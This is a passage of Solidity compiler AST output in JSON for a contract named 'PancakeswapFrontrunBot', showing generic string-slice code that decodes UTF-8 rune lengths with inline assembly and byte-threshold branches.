															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6379:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 582,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "6379:9:3"
											},
											{
												"assignments": [
													584
												],
												"declarations": [
													{
														"constant": false,
														"id": 584,
														"mutability": "mutable",
														"name": "length",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 711,
														"src": "6399:11:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 583,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6399:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 585,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "6399:11:3"
											},
											{
												"assignments": [
													587
												],
												"declarations": [
													{
														"constant": false,
														"id": 587,
														"mutability": "mutable",
														"name": "divisor",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 711,
														"src": "6421:12:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 586,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6421:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 591,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_rational_452312848583266388373324160190187140051835877600158453279131187530910662656_by_1",
														"typeString": "int_const 4523...(67 digits omitted)...2656"
													},
													"id": 590,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 588,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6436:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "BinaryOperation",
													"operator": "**",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "323438",
														"id": 589,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6441:3:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_248_by_1",
															"typeString": "int_const 248"
														},
														"value": "248"
													},
													"src": "6436:8:3",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_452312848583266388373324160190187140051835877600158453279131187530910662656_by_1",
														"typeString": "int_const 4523...(67 digits omitted)...2656"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6421:23:3"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "6512:38:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "6514:34:3",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "self",
																						"nodeType": "YulIdentifier",
																						"src": "6537:4:3"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "6543:2:3",
																						"type": "",
																						"value": "32"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "6533:3:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "6533:13:3"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "6527:5:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6527:20:3"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "6521:5:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "6521:27:3"
															},
															"variableNames": [
																{
																	"name": "word",
																	"nodeType": "YulIdentifier",
																	"src": "6514:4:3"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 567,
														"isOffset": false,
														"isSlot": false,
														"src": "6537:4:3",
														"valueSize": 1
													},
													{
														"declaration": 581,
														"isOffset": false,
														"isSlot": false,
														"src": "6514:4:3",
														"valueSize": 1
													}
												],
												"id": 592,
												"nodeType": "InlineAssembly",
												"src": "6503:47:3"
											},
											{
												"assignments": [
													594
												],
												"declarations": [
													{
														"constant": false,
														"id": 594,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 711,
														"src": "6560:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 593,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6560:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 598,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 597,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 595,
														"name": "word",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 581,
														"src": "6569:4:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 596,
														"name": "divisor",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 587,
														"src": "6576:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6569:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6560:23:3"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 601,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 599,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 594,
														"src": "6598:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30783830",
														"id": 600,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6602:4:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_128_by_1",
															"typeString": "int_const 128"
														},
														"value": "0x80"
													},
													"src": "6598:8:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 613,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 611,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 594,
															"src": "6676:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30784530",
															"id": 612,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6680:4:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_224_by_1",
																"typeString": "int_const 224"
															},
															"value": "0xE0"
														},
														"src": "6676:8:3",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 627,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 625,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 594,
																"src": "6761:1:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30784630",
																"id": 626,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6765:4:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_240_by_1",
																	"typeString": "int_const 240"
																},
																"value": "0xF0"
															},
															"src": "6761:8:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"id": 649,
															"nodeType": "Block",
															"src": "6843:66:3",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 643,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 639,
																			"name": "ret",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 570,
																			"src": "6858:3:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 642,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 640,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 594,
																				"src": "6864:1:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "&",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30783037",
																				"id": 641,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6868:4:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_7_by_1",
																					"typeString": "int_const 7"
																				},
																				"value": "0x07"
																			},
																			"src": "6864:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "6858:14:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 644,
																	"nodeType": "ExpressionStatement",
																	"src": "6858:14:3"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 647,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 645,
																			"name": "length",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 584,
																			"src": "6887:6:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "34",
																			"id": 646,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6896:1:3",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_4_by_1",
																				"typeString": "int_const 4"
																			},
																			"value": "4"
																		},
																		"src": "6887:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 648,
																	"nodeType": "ExpressionStatement",
																	"src": "6887:10:3"
																}
															]
														},
														"id": 650,
														"nodeType": "IfStatement",
														"src": "6758:151:3",
														"trueBody": {
															"id": 638,
															"nodeType": "Block",
															"src": "6771:66:3",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 632,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 628,
																			"name": "ret",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 570,
																			"src": "6786:3:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 631,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 629,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 594,
																				"src": "6792:1:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "&",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30783046",
																				"id": 630,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6796:4:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_15_by_1",
																					"typeString": "int_const 15"
																				},
																				"value": "0x0F"
																			},
																			"src": "6792:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "6786:14:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 633,
																	"nodeType": "ExpressionStatement",
																	"src": "6786:14:3"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 636,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 634,
																			"name": "length",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 584,
																			"src": "6815:6:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "33",
																			"id": 635,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6824:1:3",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_3_by_1",
																				"typeString": "int_const 3"
																			},
																			"value": "3"
																		},
																		"src": "6815:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 637,
																	"nodeType": "ExpressionStatement",
																	"src": "6815:10:3"
																}
															]
														}
													},
													"id": 651,
													"nodeType": "IfStatement",
													"src": "6673:236:3",
													"trueBody": {
														"id": 624,
														"nodeType": "Block",
														"src": "6686:66:3",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 618,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 614,
																		"name": "ret",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 570,
																		"src": "6701:3:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 617,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 615,
																			"name": "b",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 594,
																			"src": "6707:1:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "30783146",
																			"id": 616,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6711:4:3",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_31_by_1",
																				"typeString": "int_const 31"
																			},
																			"value": "0x1F"
																		},
																		"src": "6707:8:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "6701:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 619,
																"nodeType": "ExpressionStatement",
																"src": "6701:14:3"
															},
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 622,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 620,
																		"name": "length",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 584,
																		"src": "6730:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 621,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6739:1:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "6730:10:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 623,
																"nodeType": "ExpressionStatement",
																"src": "6730:10:3"
															}
														]
													}
												},
												"id": 652,
												"nodeType": "IfStatement",
												"src": "6594:315:3",
												"trueBody": {
													"id": 610,
													"nodeType": "Block",
													"src": "6608:59:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 604,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 602,
																	"name": "ret",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 570,
																	"src": "6623:3:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 603,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 594,
																	"src": "6629:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "6623:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 605,
															"nodeType": "ExpressionStatement",
															"src": "6623:7:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 608,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 606,
																	"name": "length",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 584,
																	"src": "6645:6:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 607,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "6654:1:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "6645:10:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 609,
															"nodeType": "ExpressionStatement",
															"src": "6645:10:3"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 656,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 653,
														"name": "length",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 584,
														"src": "6969:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 654,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 567,
															"src": "6978:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 655,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "6978:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6969:18:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 660,
												"nodeType": "IfStatement",
												"src": "6965:59:3",
												"trueBody": {
													"id": 659,
													"nodeType": "Block",
													"src": "6989:35:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 657,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "7011:1:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 571,
															"id": 658,
															"nodeType": "Return",
															"src": "7004:8:3"
														}
													]
												}
											},
											{
												"body": {
													"id": 707,
													"nodeType": "Block",
													"src": "7071:258:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 675,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 671,
																	"name": "divisor",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 587,
																	"src": "7086:7:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 674,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 672,
																		"name": "divisor",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 587,
																		"src": "7096:7:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "323536",
																		"id": 673,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7106:3:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_256_by_1",
																			"typeString": "int_const 256"
																		},
																		"value": "256"
																	},
																	"src": "7096:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7086:23:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 676,
															"nodeType": "ExpressionStatement",
															"src": "7086:23:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 684,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 677,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 594,
																	"src": "7124:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 683,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 680,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 678,
																					"name": "word",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 581,
																					"src": "7129:4:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "/",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 679,
																					"name": "divisor",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 587,
																					"src": "7136:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "7129:14:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 681,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7128:16:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784646",
																		"id": 682,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7147:4:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_255_by_1",
																			"typeString": "int_const 255"
																		},
																		"value": "0xFF"
																	},
																	"src": "7128:23:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7124:27:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 685,
															"nodeType": "ExpressionStatement",
															"src": "7124:27:3"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 690,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 688,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 686,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 594,
																		"src": "7170:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784330",
																		"id": 687,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7174:4:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_192_by_1",
																			"typeString": "int_const 192"
																		},
																		"value": "0xC0"
																	},
																	"src": "7170:8:3",
